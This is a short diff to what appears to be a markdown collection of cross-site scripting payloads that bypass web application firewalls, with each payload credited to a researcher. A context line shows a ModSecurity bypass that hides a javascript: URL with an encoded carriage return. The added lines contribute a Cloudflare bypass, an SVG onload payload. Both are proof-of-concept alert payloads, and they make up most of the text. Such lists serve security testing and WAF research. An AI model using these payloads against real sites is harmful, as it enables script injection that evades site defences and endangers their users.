@@ -138,7 +138,9 @@ rodolfoassis | Sucuri CloudProxy (POST only)
 
 rodolfoassis | ModSecurity CRS 3.2.0 PL1
 <a href="jav%0Dascript&colon;alert(1)">
-``` 
+   
+@brutelogic | Cloudflare
+<Svg Only=1 OnLoad=alert(1)>
 
 ### 7.Some good stuffs:
 ```js
